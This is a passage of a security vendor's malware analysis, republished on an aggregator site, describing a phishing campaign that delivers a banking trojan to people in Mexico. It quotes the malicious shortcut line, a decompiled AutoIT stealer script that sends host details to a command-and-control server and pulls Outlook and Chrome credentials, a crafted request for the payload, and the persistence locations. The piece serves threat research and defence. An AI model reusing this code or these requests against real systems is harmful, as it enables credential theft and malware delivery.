---
title: Manipulated Caiman: The Sophisticated Snare of Mexico’s Banking Predators – Technical Edition
url: https://buaq.net/go-172150.html
source: unSafe.sh - 不安全
date: 2023-07-17
fetch_date: 2025-10-04T11:51:08.804578
---

# Manipulated Caiman: The Sophisticated Snare of Mexico’s Banking Predators – Technical Edition

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/edf16463bc84f374ee6bf96db1c3a98d.jpg)

Manipulated Caiman: The Sophisticated Snare of Mexico’s Banking Predators – Technical Edition

OverviewPerception Point researchers chose the name for the threat actor, Manipulated Caim
*2023-7-16 20:42:41
Author: [perception-point.io(查看原文)](/jump-172150.htm)
阅读量:54
收藏*

---

## Overview

* Perception Point researchers chose the name for the threat actor, Manipulated Caiman, based on one of the files analyzed, containing the words “Loader Manipulado” in the pdb path. Based on extensive research, the attacker’s origin is likely Latin America, so the researchers chose the caiman reptile to represent the actor.

* Manipulated Caiman has been active for at least two years, targeting primarily the citizens of Mexico. Based on Perception Point’s research, the potential revenue the group has accumulated is over $55 million.

* There have been over 4K victims in total, with over 140 victims in the past two months alone.

* Manipulated Caiman uses a wide arsenal of tools against victims, though its ultimate goal is to gain access to victims’ bank accounts.

* Manipulated Caiman employs spear phishing with malicious attachments to deliver malware, such as URSA, SMTP bruteforce client, malicious extension installer, net info checker, and spammer client.

## May 2023 Campaign Analysis

At the end of May 2023, a massive phishing campaign was widely distributed, targeting both individuals and organizations based in Mexico.

The images below display examples of the phishing emails sent by the threat actors:

![](https://lh6.googleusercontent.com/T4BN8KgsmF1tukvOGYdJib_H2jVz7zdwjC6nCFrd1vzcUfW8lC_nomN5WuAtZwtEGOXRCEyojmA8TVhh7unfB8Ec_IzpfoLyg-7jlAd0ygekv_P1nKv75vB1itKKDIl83aZcvJcl4UO3sV5rr4MGGcM)

Each email contained a zip archive that follows the following regex pattern: **FACTURA\_PDF\_XML\_\d{6}\.zip**

The actor used topics related to [**CFDI**](https://tipalti.com/cfdi-compliance/) (an electronic invoice format mandated in Mexico) to localize the attack and deceive victims into opening the attachment, which runs the malicious file.

## Execution Flow

The attack components span multiple stages. The image below shows the steps involved in the attack:

![](https://lh4.googleusercontent.com/e07w-xZjEPSIEYnsaEtlEyz4vyj-bMRzcx-Jovahd7R8LvGxPyG9RPk39Llg6mOA-_yDVNoozcasEfSml57DkbuArBkLS24-gbsX97jkmHojfheb0w0dmKfq6LM9JfIjtmh28KcCglaqmjAucIdInU0)

The execution flow is complex and intricate. In the next section, we will break it down.

### Initial Execution Trigger

The phishing email’s attachment is actually a .zip archive containing a .url shortcut file. The file accesses and executes a path when run by the user:

```
URL=file:\\45.81.39[.][email protected]\Downloads\FACTURA_ONLINE.jse
```

![](https://lh3.googleusercontent.com/RXlys2tECYa_44LG2PyLIVI7ogsDJyJhUCCqQHVZXsZfPnxlBQOpOWo2al4ie-r5KK-kfvjHJa96bjeQBcWKLLAIztSIR7qr3lOAl6_og0_WRYeT9rKEjkBdhEzazAaMCY94jHJVDwMqSOA0Jli14a8)

**FACTURA\_ONLINE.jse** presents a message box with the text:

***“Este mensaje ha sido emitido por error. por favor haga caso omiso.”*** (**English:** This message has been issued in error. please ignore).

The script then sends a GET request to the following URL:

https://jogjaempatroda[.]com/redirect/inc3/ex.php?x=1

![](https://lh6.googleusercontent.com/Acbl71aW5ZzsonpgtR3bPuJ9L3vXKQRjQ80785oWNWfrFZ5MMg3Wt27qcgeFSRrb0HyHUZJDd8l9ixRpsIWi6thhofHuPQ669M4XcOQ6VyR7tHe3nQS35GbzZQsvY1tk0I1PwgMaD0iKgag45wnOOSA)

The script then tries to run the content returned from the request. If the request comes from an IP located in Mexico, the script will run a malicious code in response. This attack uses a form of geofencing, meaning that if the request comes from anywhere outside of Mexico, a legitimate website is displayed and the execution of the script terminates.

Below you can see the difference in responses to a request that originates within Mexico and to a request that comes from outside of the country:

![](https://lh3.googleusercontent.com/Y_Hw_qxGu_vH_RV3SZs5QmuM4YbRHzphn8Shrt0zuRd-wCbNj2VKuz9KNGLt7I-ZtGEopx8IRrq-UzfnXTDCPTG-Wwx_hvsQpMCRpHI3DdyOPsbUVfK7hDg38Anz3x1xSg_NcGWzR6IDnvVd009KTPI)
![](https://lh5.googleusercontent.com/AzkjTZuwLdO0j73frFpYOl0A6s_LGjIQjz0zjgCRPMMSQNHDqcKm3w3w4HVk8OcjWzz50K-KDbai_wzQCX6KrgEXgXm8uwQVLGuxkRxAzZRGnqBFwMj7T-KWf9zwksfBldOP8HpmJ9H0gCCxDeWDBks)

The malicious response contains two base64 certificates which will both be decoded and saved on the victim’s computer under the following path:

```
%APPDATA%/lamentacao/habitarao.exe
%APPDATA%/lamentacao/escreverao.a3x
```

### AutoIT Downloader & InfoStealer

**Habitarao.exe** is the legitimate AutoIT3.exe that is used for execution of AutoIT compiled scripts. (.a3x) It is used to execute **escreverao.a3x**.

**Escreverao.a3x** is a compiled AutoIT script that can be decompiled using online tools such as [myAut2Exe](https://github.com/fossabot/myAut2Exe). We analyzed the script and found that it shares a similar structure with previously disclosed campaigns associated with the [URSA Trojan Banker](https://malpedia.caad.fkie.fraunhofer.de/details/win.mispadu):

```
Global $SURLINFO = "https://jogjaempatroda.com/redirect/inc3/do/it.php"
If _ISWIN7() Then $SURLINFO = "http://jogjaempatroda.com/redirect/inc3/do/it.php"
FileDelete(@ScriptFullPath)
Local $ISADMIN = "User"
If IsAdmin() Then $ISADMIN = "Admin"
Local $SSERIAL = Hex(DriveGetSerial(@HomeDrive & "\")) & "1"
_ILNKER($SURLINFO & "?b1&v1=" & Dec(@OSLang) & "&v2=" & Dec(@KBLayout) & "&v3=&v4=" & _GETOS() & "&v5=" & $ISADMIN & "&v6=" & @OSArch & "&v7=" & AV() & "&v9=" & $SSERIAL, $SURLINFO)
_OUTRECOVERY()
_CHROMERECOVERY()
_OLISTS($SURLINFO & "?b3&v1=" & Dec(@OSLang) & "&v2=" & Dec(@KBLayout) & "&v3=&v4=" & _GETOS() & "&v5=" & $ISADMIN & "&v6=" & @OSArch & "&v7=" & AV())
```

The script executes three main operations:

1. Fetch next stage payload
2. Create persistence
3. Outlook & Chrome credentials stealer

The script creates a **GET** request to the URL:

https://jogjaempatroda[.]com/redirect/inc3/do/it.php

The **GET** request contains information added by the script:

* v1 = operation system language
* v2 = keyboard layout
* v4 = operation system
* v5 = admin privileges
* v6 = operation system architecture
* v7 = installed antivirus softwares
* v9 = default disk serial number

![](https://lh3.googleusercontent.com/_QHV5nSwz8ip1dJUlz9DV28oa9CnMAS39ip-S_OL9ZCDgw2hOpwtitF4UIbK58OotEFYnneUEAmBNea8jrnTmcVzjzgAfVogwT9JRK8o6JGfheQmmFL98j45rYRxWy88fJSBUZ8rK1iatZpArkOIZpw)

When investigating the script, we first let it run since we did not receive the payload. This was because we sent data from a computer with an English operating system.

The values of **v1** and **v2** in our case were: **1033** (English – United States)

Because we knew that the campaign was intended for a Mexican audience, we changed the values of **v1** and **v2** to **2058** (Spanish – Mexico). We received the payload in response to our updated request. The script will later run the following payload:

```
https://jogjaempatroda[.]com/redirect/inc3/do/it.php?b1&v1=2058&v2=2058&v3=&v4=Windows 7&v5=User&v6=X64&v7=Microsoft Defender
```

The downloaded payload is saved in the same folder where the executables are located under the name **h2kvs7ajf4**.

The script then creates two different persistence methods:

1. Creating a value under the registry key: **HKEY\_CURRENT\_USER\Software\Microsoft\Windows\CurrentVersion\Run**
2. Creating a shortcut file (.lnk) under the startup folder: **[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup**

The script then executes t...